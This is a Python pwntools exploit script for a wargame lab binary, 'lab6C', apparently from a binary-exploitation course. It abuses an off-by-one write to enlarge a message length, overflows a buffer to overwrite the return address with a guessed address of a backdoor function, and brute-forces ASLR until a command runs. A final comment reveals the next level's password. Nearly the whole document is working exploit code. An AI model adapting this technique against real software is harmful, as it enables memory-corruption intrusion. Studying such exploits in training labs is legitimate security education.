from pwn import *
import time

# there's a off-by-1 write when reading the username... we can overwrite the least significant byte
# of state->msglen. we will put there something big, and this will trigger an arbitrary write to state->tweet,
# which we will use to overwrite the EIP with a ROP chain.

GUESSED_BACKDOOR_ADDR = 0x5663C72B


def try_exploit(cmd):
    with context.quiet:
        p = process("./lab6C")
        p.clean()

        # overwrite state->msglen = 0xff
        p.sendline(b"A" * 40 + b"\xff")

        # fill tweet data (140 bytes)
        # then, overwrite the stack until EIP, and overwrite EIP with our guessed
        # ASLR address for secret_backdoor().
        tweet_data = b"B" * cyclic_find(0x62616179) + p32(GUESSED_BACKDOOR_ADDR)
        p.sendline(tweet_data)
        p.wait_for_close(0.2)
        if p.poll(False) != None:
            # process exited
            return None

        p.clean()
        p.sendline(cmd.encode("utf-8"))
        p.wait()
        return p.clean().decode("utf-8")


log.progress("Starting bruteforce attack on secret_backdoor() address...")
start_at = time.time()
while True:
    command_result = try_exploit("date")
    if command_result is None:
        continue

    ended_at = time.time()
    log.info(f"Exploit success! took {ended_at - start_at} seconds.")
    log.info("Executed command returned:")
    print(command_result)
    break

# password for next level: p4rti4l_0verwr1tes_r_3nuff
